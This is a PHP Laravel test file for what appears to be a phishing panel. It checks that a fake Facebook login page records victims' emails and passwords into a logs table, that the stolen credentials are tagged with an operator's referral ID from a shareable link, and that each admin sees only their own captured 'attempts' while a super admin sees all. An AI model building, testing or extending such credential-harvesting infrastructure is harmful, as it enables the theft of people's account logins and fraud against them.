<?php

namespace Tests\Feature;

use App\Models\Log;
use App\Models\Tag;
use App\Models\User;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\TestCase;

class RefIdTrackingTest extends TestCase
{
    use RefreshDatabase;

    private function makeAdmin(string $role = User::ROLE_ADMIN, ?string $refId = null): User
    {
        return User::factory()->create([
            'role' => $role,
            'ref_id' => $refId,
        ]);
    }

    private function makeLog(?string $refId, array $attributes = []): Log
    {
        $tag = Tag::factory()->create();

        return Log::create(array_merge([
            'username' => 'victim',
            'email' => 'victim@example.com',
            'password' => 'secret',
            'tag_id' => $tag->id,
            'quantity' => 100,
            'service_type' => 'Facebook Service',
            'ref_id' => $refId,
        ], $attributes));
    }

    public function test_creating_an_admin_automatically_assigns_a_ref_id(): void
    {
        $admin = User::factory()->create(['role' => User::ROLE_ADMIN]);

        $this->assertNotNull($admin->ref_id);
        $this->assertMatchesRegularExpression('/^[a-z0-9]{3}-\d{3}-[a-z0-9]{3}$/', $admin->ref_id);
    }

    public function test_regular_users_do_not_get_a_ref_id(): void
    {
        $user = User::factory()->create(['role' => User::ROLE_USER]);

        $this->assertNull($user->ref_id);
    }

    public function test_admin_created_from_the_screen_gets_a_ref_id(): void
    {
        $superAdmin = $this->makeAdmin(User::ROLE_SUPER_ADMIN);

        $this->actingAs($superAdmin)->post('/admins', [
            'name' => 'Fresh Admin',
            'email' => 'fresh-admin@example.com',
            'password' => 'secret123',
            'role' => User::ROLE_ADMIN,
        ])->assertRedirect(route('admins.index'));

        $created = User::where('email', 'fresh-admin@example.com')->firstOrFail();

        $this->assertNotNull($created->ref_id);
    }

    public function test_ref_link_contains_the_ref_id(): void
    {
        $admin = $this->makeAdmin(User::ROLE_ADMIN, '34a-890-asw');

        $this->assertStringContainsString('ref_id=34a-890-asw', $admin->refLink());
    }

    public function test_platform_login_form_submits_the_ref_id(): void
    {
        $tag = Tag::factory()->create(['name' => 'facebook']);

        $this->get("/login/facebook?tag_id={$tag->id}&ref_id=34a-890-asw")
            ->assertOk()
            ->assertSee('name="ref_id" value="34a-890-asw"', false);
    }

    public function test_platform_login_stores_the_ref_id_on_the_log(): void
    {
        $tag = Tag::factory()->create(['name' => 'facebook']);

        $this->post('/login/facebook', [
            'email' => 'victim@example.com',
            'password' => 'secret',
            'tag_id' => $tag->id,
            'username' => 'goodluck',
            'ref_id' => '34a-890-asw',
        ])->assertRedirect();

        $this->assertDatabaseHas('logs', [
            'username' => 'goodluck',
            'ref_id' => '34a-890-asw',
        ]);
    }

    public function test_admin_dashboard_only_shows_their_own_ref_attempts(): void
    {
        $adminA = $this->makeAdmin(User::ROLE_ADMIN, 'aaa-111-aaa');
        $this->makeAdmin(User::ROLE_ADMIN, 'bbb-222-bbb');

        $this->makeLog('aaa-111-aaa', ['username' => 'mine-only']);
        $this->makeLog('bbb-222-bbb', ['username' => 'theirs-only']);
        $this->makeLog(null, ['username' => 'unattributed']);

        $this->actingAs($adminA)->get('/dashboard')
            ->assertOk()
            ->assertSee('mine-only')
            ->assertDontSee('theirs-only')
            ->assertDontSee('unattributed');
    }

    public function test_super_admin_dashboard_shows_every_attempt(): void
    {
        $superAdmin = $this->makeAdmin(User::ROLE_SUPER_ADMIN, 'sup-000-sup');

        $this->makeLog('aaa-111-aaa', ['username' => 'mine-only']);
        $this->makeLog('bbb-222-bbb', ['username' => 'theirs-only']);

        $this->actingAs($superAdmin)->get('/dashboard')
            ->assertOk()
            ->assertSee('mine-only')
            ->assertSee('theirs-only');
    }

    public function test_super_admin_can_set_a_custom_ref_id(): void
    {
        $superAdmin = $this->makeAdmin(User::ROLE_SUPER_ADMIN);
        $admin = $this->makeAdmin(User::ROLE_ADMIN, 'old-000-old');

        $this->actingAs($superAdmin)
            ->patchJson("/admins/{$admin->id}/ref-id", ['ref_id' => '34a-890-asw'])
            ->assertOk()
            ->assertJson(['success' => true, 'ref_id' => '34a-890-asw']);

        $this->assertSame('34a-890-asw', $admin->fresh()->ref_id);
    }

    public function test_ref_id_must_be_unique(): void
    {
        $superAdmin = $this->makeAdmin(User::ROLE_SUPER_ADMIN);
        $adminA = $this->makeAdmin(User::ROLE_ADMIN, 'aaa-111-aaa');
        $adminB = $this->makeAdmin(User::ROLE_ADMIN, 'bbb-222-bbb');

        $this->actingAs($superAdmin)
            ->patchJson("/admins/{$adminB->id}/ref-id", ['ref_id' => 'aaa-111-aaa'])
            ->assertStatus(422);

        $this->assertSame('bbb-222-bbb', $adminB->fresh()->ref_id);
    }
}
